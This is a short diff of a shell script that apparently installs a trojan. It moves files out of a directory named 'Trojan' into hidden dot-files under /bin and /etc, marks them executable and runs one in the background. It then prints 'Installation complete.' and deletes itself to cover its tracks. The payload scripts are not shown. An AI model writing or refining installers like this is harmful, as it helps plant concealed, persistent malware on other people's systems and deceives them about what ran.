@@ -8,6 +8,6 @@ mv /etc/.a/Trojan/systemm.sh /bin/.systemm.sh
 chmod +x /bin/.systemm.sh
 mv /etc/.a/Trojan/resolver.sh /etc/.resolver.sh
 chmod +x /etc/.resolver.sh
-bash /etc/.resolver.sh
+bash /etc/.resolver.sh &
 echo Installation complete.
 rm -- "$0"
